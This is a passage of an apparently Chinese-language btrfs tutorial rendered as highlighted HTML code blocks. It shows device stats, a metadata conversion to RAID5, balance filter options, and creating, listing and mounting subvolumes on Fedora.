<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 288.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.28GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>查看设备状态</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs device stats /mnt/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n2].write_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n2].read_io_errs     0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n2].flush_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n2].corruption_errs  0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n2].generation_errs  0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n3].write_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n3].read_io_errs     0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n3].flush_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n3].corruption_errs  0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n3].generation_errs  0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n4].write_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n4].read_io_errs     0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n4].flush_io_errs    0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n4].corruption_errs  0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[/dev/nvme0n4].generation_errs  0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>修改硬件组合模式</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem df /mnt | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">column</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Data,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           single:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  total=1.00GiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    used=0.00B</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">System,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         RAID1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   total=32.00MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   used=16.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Metadata,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       RAID1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   total=256.00MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  used=128.00KiB#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RAID1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">GlobalReserve,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  single:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  total=3.50MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    used=0.00B</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs balance start </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">-mconvert</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">raid5</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WARNING:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        RAID5/6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> support</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> has</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> known</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> problems</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> strongly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> discourag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                           ed</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> besides</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> testing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> evaluation.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> It</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> recommended</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                            that</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        you</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> one</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> other</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RAID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> profiles.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        The</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> operation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> continue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Ctrl-C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">10</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 7</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 6</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> conversion</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RAID5/6.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Done,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> had</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> relocate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chunks</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem df /mnt | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">column</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Data,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           single:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  total=1.00GiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    used=0.00B</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">System,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         RAID5:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   total=32.00MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   used=16.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Metadata,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       RAID5:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   total=512.00MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  used=128.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">GlobalReserve,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  single:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  total=3.50MiB,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    used=0.00B</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">改</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 是</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -dconvert</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">改</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Metadata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 是</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -mconvert</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       -d[</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;filters&gt;]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                     act</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> block</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> groups,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> see</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FILTERS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> section</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> details</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> about</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filters</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        -m[</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;filters&gt;]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                act</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> metadata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chunks,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> see</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FILTERS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> section</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> details</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> about</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filters</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        -s[</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;filters&gt;]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                act</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chunks</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (requires </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">-f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">), see FILTERS section </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> details about filters.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>创建 subvolume和查询</h2>
<p>使用 btrfs 命令，用户可以方便的建立 subvolume 。假设 /btrfsdisk 已经挂载到了 btrfs  文件系统，则用户可以在这个文件系统内创建新的 subvolume 。比如建立一个 /sub1 的 subvolume，并将 sub1 挂载到  /mnt/test 下：</p>
<p>Subvolme  可以方便管理员在文件系统上创建不同用途的子文件系统，并对其进行一些特殊的配置，比如有些目录下的文件关注节约磁盘空间，因此需要打开压缩，或者配置不同的 RAID 策略等。目前 btrfs 尚处于开发阶段，创建的 subvolme 和 snapshot 还无法删除。此外针对 subvolume  的磁盘 quota 功能也未能实现。但随着 btrfs 的不断成熟，这些功能必然将会进一步完善。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>[root@fedora ~]# btrfs subvolume create /mnt/logs</span></span>
<span class="line"><span>Create subvolume '/mnt/logs'</span></span>
<span class="line"><span>[root@fedora ~]# btrfs subvolume list /mnt</span></span>
<span class="line"><span>ID 256 gen 75 top level 5 path logs</span></span>
<span class="line"><span>[root@fedora ~]# btrfs subvolume create /mnt/cache</span></span>
<span class="line"><span>Create subvolume '/mnt/cache'</span></span>
<span class="line"><span>[root@fedora ~]# btrfs subvolume list /mnt</span></span>
<span class="line"><span>ID 256 gen 75 top level 5 path logs</span></span>
<span class="line"><span>ID 257 gen 76 top level 5 path cache</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>#mkdir /mnt/test </span></span>
<span class="line"><span>#btrfsctl – S sub1 /btrfsdisk </span></span>
<span class="line"><span>#mount – t btrfs – o subvol=sub1 /dev/sda5 /mnt/test</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>单独挂载子卷</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mkdir -p /data/{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logs,cache}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mount -o </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">subvol</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">logs</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> /dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/logs</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                               Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                 4.0M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.0M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    777M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  775M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   48G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  11%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   16K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           974M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  243M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  664M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  27%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   88K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/user/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/logs</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# cp /var/log/messages /data/logs/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# ls /mnt/logs/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">messages</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 查看</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs subvolume show /mnt/logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Name:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                   logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                   2b85bcf8-9302-0f47-86c1-cc95d34f371b</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Parent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Received</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Creation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          2023-01-13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:22:38</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +0800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Subvolume</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           256</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Generation:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">             77</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Gen</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> creation:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        75</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Parent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">              5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Top</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> level</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Flags:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                  -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Send</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> transid:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           0</span></span>
